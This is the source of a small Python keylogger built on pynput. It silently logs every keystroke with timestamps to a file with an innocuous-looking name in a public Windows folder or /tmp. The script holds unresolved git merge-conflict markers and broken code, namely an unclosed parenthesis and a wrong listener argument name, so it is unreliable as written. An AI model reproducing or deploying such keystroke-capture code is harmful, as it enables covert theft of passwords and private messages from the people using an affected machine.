from pynput.keyboard import Key, Listener
import platform
import sys
import logging

<<<<<<< HEAD
win_dir = r"C:/users/public/roaming"
lin_dir = r"/tmp"
log_dir = win_dir

if platform.system() == 'Linux':
    log_dir = lin_dir

=======
log_dir = r"C:/users/public/roaming/"
>>>>>>> 56629542c5f8c904449d3c7642e86972a3a4dbf6

try:
    logging.basicConfig (
                        filename=(log_dir+"/systemprivate-5081219092021.txt",
                        format='%(asctime)s: %(message)s'
                        )
except FileNotFoundError:
    print("File Path DNE. Terminating ...")
    sys.exit(0)

def keyPress(key):
    logging.info(str(key))

with Listener(keyPress=keyPress) as listener:
    listener.join()
